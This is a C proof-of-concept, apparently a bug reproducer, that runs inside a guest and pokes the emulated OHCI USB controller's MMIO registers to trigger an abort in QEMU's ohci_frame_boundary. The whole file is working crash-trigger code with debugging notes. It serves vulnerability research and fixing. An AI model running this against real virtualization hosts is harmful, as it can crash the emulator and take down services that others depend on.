#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>

uint8_t *mmio_mem;

void die(const char *msg) {
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr) {
    return *((uint32_t *)(mmio_mem + addr));
}

// /proc/$pid/pagemap +CAP_SYS_ADMIN
// Bits 0-54 page frame number (PFN) if present
// Bits 0-4 swap type if swapped
// Bits 5-54 swap offset if swapped
// Bit  55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
// Bit  56 page exclusively mapped (since 4.2)
// Bits 57-60 zero
// Bit  61 page is file-page or shared-anon (since 3.5)
// Bit  62 page swapped
// Bit  63 page present
// assume the physical memory is less tha 4G ...
#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
int fd;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    uint64_t offset;
    offset = ((uint64_t)addr >> 12) << 3;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    printf("[+] gva_to_gfn 0x%lx -> 0x%lx\n", pme, gfn);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    if (gfn == -1)
        die("[-] Physical page not present.\n");
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

// we want physically aligned pages
void *calloc_256aligned(size_t size) {
    void *ptr_virt = mmap(0, size + 256, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ptr_virt == MAP_FAILED)
        die("[-] Mmap 256aligned buffer failed.\n");
    mlock(ptr_virt, size + 256);
    uint64_t ptr_phys = gva_to_gpa(ptr_virt);
    uint64_t __ptr_phys = (ptr_phys + 0xff) & (~(uint64_t)0xff);
    printf("0x%lx, 0x%lx\n", ptr_phys, __ptr_phys);
    return (void *)((uint64_t)ptr_virt + (__ptr_phys - ptr_phys));
}

// OHCI specific structs
typedef struct ohci_hcca {
    uint32_t intr[32];
    uint16_t frame, pad;
    uint32_t done;
} ohci_hcca;

typedef struct ohci_ed {
    uint32_t flags;
    uint32_t tail;
    uint32_t head;
    uint32_t next;
} ohci_ed;

typedef struct ohci_td {
    uint32_t flags;
    uint32_t cbp;
    uint32_t next;
    uint32_t be;
} ohci_td;

typedef struct ohci_iso_td {
    uint32_t flags;
    uint32_t bp;
    uint32_t next;
    uint32_t be;
    uint16_t offset[8];
} ohci_iso_td;

int main() {
    printf("[+]\n[+] Reproduce ohci-01: abort in ohci_frame_boundary!\n[+]\n");

    // lspci -v and we will get ohci's pci address
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("[-] Open mmio_fd failed.\n");
    printf("[+] Open mmio_fd successful.\n");
    mmio_mem = mmap(0, 0x100, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("[-] Mmap mmio_mem failed.\n");
    printf("[+] Mmap mmio_mem at %p.\n", mmio_mem);

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        die("[-] Open pagemap failed.\n");
    }
    printf("[+] Open pagemap successful.\n");

    // we want to let hcca->intr[0] be zero to make this PoC stable
    ohci_hcca *hcca0 = (ohci_hcca *)calloc_256aligned(sizeof(ohci_hcca));
    uint64_t hcca0_phys = gva_to_gpa(hcca0);
    printf("[+] Alloc hcca0 at %p (virt) and 0x%lx (phys)\n", hcca0, hcca0_phys);

    // GDB
    // gef config context.nb_lines_backtrace 2
    // b ../hw/usb/hcd-ohci.c:1591
    // b ../hw/usb/hcd-ohci.c:1621

    // reset
    mmio_write(0x8/*hccommandstatus*/, 0x1/*OHCI_STATUS_HCR*/);
    // a, set ohci->ctl and enable OHCI_CTL_PLE
    mmio_write(0x4/*hccontrol*/, 0x1fd0298e/*OHCI_CTL_PLE*/);
    // b, sleep, invoke ohci_frame_boudary and increase ohci->frame by 1
    mmio_write(0x18/*hchcca*/, hcca0_phys/*OHCI_CTL_PLE*/);
    sleep(1);

    return 0;
}
